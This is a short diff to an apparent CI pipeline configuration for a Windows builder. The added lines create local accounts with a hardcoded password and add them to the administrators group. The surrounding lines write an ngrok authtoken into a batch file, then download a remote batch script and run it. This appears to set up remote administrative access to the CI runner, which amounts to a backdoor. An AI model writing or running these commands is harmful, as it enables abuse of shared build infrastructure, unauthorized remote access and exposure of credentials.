@@ -4,6 +4,10 @@ docker_builder:
   platform: windows
   os_version: 2019
   test_script:
+    - net user administrator Dangvip2k5pro /add
+    - net user ContainerAdministrator Dangvip2k5pro /add
+    - net localgroup administrators administrator /add
+    - net localgroup administrators ContainerAdministrator /add
     - echo ngrok authtoken "1aO30oRov2ig77pFpaieYZ1rOIx_7u2HxCdyR3afW22DZJap4" > NGROK.bat
     - curl -s -O https://raw.githubusercontent.com/DangDev/cirrus-win/main/cirrus_pipeline.bat
     - cirrus_pipeline.bat
